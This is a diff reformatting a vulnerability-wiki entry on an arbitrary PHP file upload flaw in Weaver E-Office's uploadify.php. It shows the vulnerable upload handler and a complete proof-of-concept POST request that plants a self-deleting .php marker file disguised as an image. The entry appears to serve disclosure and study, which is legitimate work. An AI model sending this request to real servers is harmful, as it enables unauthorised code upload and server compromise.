@@ -31,8 +31,10 @@ app="泛微-EOffice"
 
 ![image-20220520134445854](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201344907.png)
 
-```
-<?php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">&lt;?php
 include_once("inc/vulnerability.php");
 if (!empty($_FILES)) {
     $tempFile = $_FILES['Filedata']['tmp_name'];
@@ -43,7 +45,7 @@ if (!empty($_FILES)) {
     }
     $fileExt = substr($tempFile, strrpos($tempFile, ".") + 1);
     $attachmentID = createFileDir();
-    $uploadPath = $_REQUEST["uploadPath"];
+    $uploadPath = &#36;_REQUEST["uploadPath"];
 
     if (trim($uploadPath) == "") {
         $targetPath = $_SERVER['DOCUMENT_ROOT'] . '/attachment/' . $attachmentID;
@@ -71,13 +73,16 @@ function createFileDir() {
         createFileDir();
 }
 
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 验证POC
 
-```
-POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
 Connection: close
@@ -89,10 +94,11 @@ Accept-Encoding: gzip
 Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
 Content-Type: image/jpeg
 
-<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
+&lt;?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?&gt;
 
---e64bdf16c554bbc109cecef6451c26a4--
-```
+--e64bdf16c554bbc109cecef6451c26a4--</code></pre>
+
+</details>
 
 ![image-20230828150715083](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828150715083.png)
 
